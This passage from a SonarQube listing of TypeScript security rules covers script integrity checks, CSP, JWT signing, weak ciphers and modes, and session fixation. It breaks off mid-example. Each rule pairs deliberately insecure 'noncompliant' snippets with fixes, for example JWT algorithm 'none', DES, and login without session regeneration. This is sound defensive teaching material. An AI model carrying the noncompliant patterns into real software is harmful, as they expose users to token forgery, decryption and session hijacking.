&lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Web Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/359">CWE-359 - Exposure of Private Information</a> </li>
  <li> <a href="https://www.w3.org/TR/permissions/">W3C</a> - Permissions </li>
  <li> <a href="https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites">Mozilla</a> - Does Firefox share my location with
  websites? </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5725">
              typescript:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul>
  <li> impersonate users' identities and take advantage of their privileges on the application. </li>
  <li> add quiet malware that monitors users' session and capture sensitive secrets. </li>
  <li> gain access to sensitive clients' personal data. </li>
  <li> deface, or otherwise affect the general availability of the application. </li>
  <li> mine cryptocurrencies in the background. </li>
</ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul>
  <li> access and modify sensitive technical and business data. </li>
  <li> elevate its privileges on the underlying operating system. </li>
  <li> Use the compromised application as a pivot to attack the local network. </li>
</ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The artifact is a file intended to execute code. </li>
  <li> The artifact is a file that is intended to configure or affect running code in some way. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul>
  <li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li>
  <li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li>
</ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named "latest" or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
let script = document.createElement("script");
script.src = "https://cdn.example.com/latest/script.js"; // Sensitive
script.crossOrigin = "anonymous";
document.head.appendChild(script);
</pre>
<h2>Compliant Solution</h2>
<pre>
let script = document.createElement("script");
script.src = "https://cdn.example.com/v5.3.6/script.js";
script.integrity = "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC";
script.crossOrigin = "anonymous";
document.head.appendChild(script);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/353">CWE-353 - Missing Support for Integrity Check</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">developer.mozilla.org</a> - Subresource Integrity </li>
  <li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack">Wikipedia, Watering Hole Attacks</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5728">
              typescript:S5728
            </a>
          </td>
          <td>
            <details>
              <p>Content security policy (CSP) (fetch directives) is a <a href="https://www.w3.org/TR/CSP3/">W3C standard </a> which is used by a server to specify,
via a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)
attacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">same-origin policy</a> by default.</p>
<pre>
Content-Security-Policy: default-src 'self'; script-src ‘self ‘ http://www.example.com
</pre>
<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also
authorized:</p>
<pre>
&lt;img src="selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src 'self'; directive is applied  --&gt;
&lt;img src="http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src 'self'; directive is applied  --&gt;
&lt;script src="http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
&lt;script src="selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;
&lt;script src="http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The resources of the application are fetched from various untrusted locations. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all
inputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>
<h2>Sensitive Code Example</h2>
<p>In a Express.js application, the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> contentSecurityPolicy
middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();
app.use(
    helmet({
      contentSecurityPolicy: false, // sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In a Express.js application, a standard way to implement CSP is the <a href="https://www.npmjs.com/package/helmet">helmet contentSecurityPolicy
middleware</a>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();
app.use(helmet.contentSecurityPolicy()); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5659">
              typescript:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in jsonwebtoken</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const jwt = require('jsonwebtoken');

jwt.sign(payload, key, { algorithm: 'none' }); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const jwt = require('jsonwebtoken');

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: ['none'] // Noncompliant
}, callbackcheck);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const jwt = require('jsonwebtoken');

jwt.sign(payload, key, { algorithm: 'HS256' });
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const jwt = require('jsonwebtoken');

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: ['HS256']
}, callbackcheck);
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue, follow these instructions:</p>
<ol>
  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>
  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for
  further investigation. </li>
  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>
</ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5547">
              typescript:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

crypto.createCipheriv("DES", key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-256-GCM", key, iv);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5542">
              typescript:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-128-CBC", key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto = require('crypto');

crypto.createCipheriv("AES-256-GCM", key, iv);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5876">
              typescript:S5876
            </a>
          </td>
          <td>
            <details>
              <p>An attacker may trick a user into using a predetermined session identifier. Consequently, this attacker can gain unauthorized access and
impersonate the user’s session. This kind of attack is called session fixation, and protections against it should not be disabled.</p>
<h2>Why is this an issue?</h2>
<p>Session fixation attacks take advantage of the way web applications manage session identifiers. Here’s how a session fixation attack typically
works:</p>
<ul>
  <li> When a user visits a website or logs in, a session is created for them. </li>
  <li> This session is assigned a unique session identifier, stored in a cookie, in local storage, or through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. For example,
  the attacker sends the victim an email containing a link with this predetermined session identifier. </li>
  <li> When the victim clicks on the link, the web application does not create a new session identifier but uses this identifier known to the
  attacker. </li>
  <li> At this point, the attacker can hijack and impersonate the victim’s session. </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Session fixation attacks pose a significant security risk to web applications and their users. By exploiting this vulnerability, attackers can gain
unauthorized access to user sessions, potentially leading to various malicious activities. Some of the most relevant scenarios are the following:</p>
<h4>Impersonation</h4>
<p>Once an attacker successfully fixes a session identifier, they can impersonate the victim and gain access to their account without providing valid
credentials. This can result in unauthorized actions, such as modifying personal information, making unauthorized transactions, or even performing
malicious activities on behalf of the victim. An attacker can also manipulate the victim into performing actions they wouldn’t normally do, such as
revealing sensitive information or conducting financial transactions on the attacker’s behalf.</p>
<h4>Data Breach</h4>
<p>If an attacker gains access to a user’s session, they may also gain access to sensitive data associated with that session. This can include
personal information, financial details, or any other confidential data that the user has access to within the application. The compromised data can
be used for identity theft, financial fraud, or other malicious purposes.</p>
<h4>Privilege Escalation</h4>
<p>In some cases, session fixation attacks can be used to escalate privileges within a web application. By fixing a session identifier with higher
privileges, an attacker can bypass access controls and gain administrative or privileged access to the application. This can lead to unauthorized
modifications, data manipulation, or even complete compromise of the application and its underlying systems.</p>
<h2>How to fix it in Passport</h2>
<h3>Code examples</h3>
<p>Upon user authentication, it is crucial to regenerate the session identifier to prevent fixation attacks. Passport provides a mechanism to achieve
this by using the <code>req.session.regenerate()</code> method. By calling this method after successful authentication, you can ensure that each user
is assigned a new and unique session ID.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    // Noncompliant - no session.regenerate after login
    res.redirect('/');
  });
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    let prevSession = req.session;
    req.session.regenerate((err) =&gt; {
      Object.assign(req.session, prevSession);
      res.redirect('/');
    });
  });
</pre>
<h3>How does this work?</h3>
<p>The protection works by ensuring that the session identifier, which is used to identify and track a user’s session, is changed or regenerated
during the authentication process.</p>
<p>Here’s how session fixation protection typically works:</p>
<ol>
  <li> When a user visits a website or logs in, a session is created for them. This session is assigned a unique session identifier, which is stored
  in a cookie or passed through URL parameters. </li>
  <li> In a session fixation attack, an attacker tricks a user into using a predetermined session identifier controlled by the attacker. This allows
  the attacker to potentially gain unauthorized access to the user’s session. </li>
  <li> To protect against session fixation attacks, session fixation protection mechanisms come into play during the authentication process. When a
  user successfully authenticates, this mechanism generates a new session identifier for the user’s session. </li>
  <li> The old session identifier, which may have been manipulated by the attacker, is invalidated and no longer associated with the user’s session.
  This ensures that any attempts by the attacker to use the fixed session identifier are rendered ineffective. </li>
  <li> The user is then assigned the new session identifier, which is used for subsequent requests and session tracking. This new session identifier
  is typically stored in a new session cookie or passed through URL parameters. </li>
</ol>
<p>By regenerating the session identifier upon authentication, session fixation protection helps ensure that the user’s session is tied to a new,
secure identifier that the attacker cannot predict or control. This mitigates the risk of an attacker gaining unauthorized access to the user’s
session and helps maintain the integrity and security of the application’s session management process.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Express.js Documentation - <a href="http://expressjs.com/en/resources/middleware/session.html">express-session</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://medium.com/passportjs/fixing-session-fixation-b2b68619c51d">Fixing Session Fixation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> <a href="https://owasp.org/www-community/attacks/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4787">
              typescript:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS4426&rule_key=javascript%3AS4426'>S4426</a>, <a href='/organizations/sopra-steria/rules?open=javascript%3AS5542&rule_key=javascript%3AS5542'>S5542</a>, <a href='/organizations/sopra-steria/rules?open=javascript%3AS5547&rule_key=javascript%3AS5547'>S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902">CVE-2017-7902</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378">CVE-2006-1378</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like "Chosen-Plaintext Attacks". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === Client side ===
crypto.subtle.encrypt(algo, key, plainData); // Sensitive
crypto.subtle.decrypt(algo, key, encData); // Sensitive
</pre>
<pre>
// === Server side ===
const crypto = require("crypto");
const cipher = crypto.createCipher(algo, key); // Sensitive
const cipheriv = crypto.createCipheriv(algo, key, iv); // Sensitive
const decipher = crypto.createDecipher(algo, key); // Sensitive
